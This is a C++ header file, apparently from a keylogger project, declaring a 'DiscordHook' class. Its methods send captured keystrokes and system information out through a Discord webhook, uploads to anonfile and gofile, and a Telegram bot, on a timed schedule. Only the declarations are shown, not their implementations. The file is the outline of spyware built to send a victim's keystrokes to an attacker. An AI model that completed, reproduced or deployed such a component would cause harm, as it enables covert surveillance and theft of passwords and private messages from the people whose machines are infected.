#include <string>

class DiscordHook
{
public:
    static int MaxKeylogs;
	//Message id location
	static std::string LatestMessageIdLocation;
	//Keylogs histroy file
	static std::string KeylogHistory;
	//Save lastest message id to file 
	static void SetLatestmessageId(std::string id);
	//Get Lastest message id from file
	static std::string GetLatestmessageId();
	static std::string GetMessageId(std::string response);

	static bool WebhookIsValidAsync();
	//Send message to discord channel
	static std::string SendMessageAsync(std::string text);
	static std::size_t WriteCallback(char* ptr, std::size_t size, std::size_t nmemb, std::string* data);
	//Edit message text in discord channel
	static void  EditMessageAsync(std::string, std::string id);
	//Upload keylogs to anonfile
	static void UploadKeylogs();
	//Get strin with keylogs history
	static std::string GetKeylogsHistory();
	//String system information for sending to telergram bot
	static void SendSystemInfoAsync(std::string url);
	static void SendReportAsync(std::string file);

	static void TimedTransmissionKeylogger();
	static void CheckDirectorySize(const std::string directoryPath);

	static std::string getRequest(const std::string& url);
	static std::wstring getBestgofile();

};
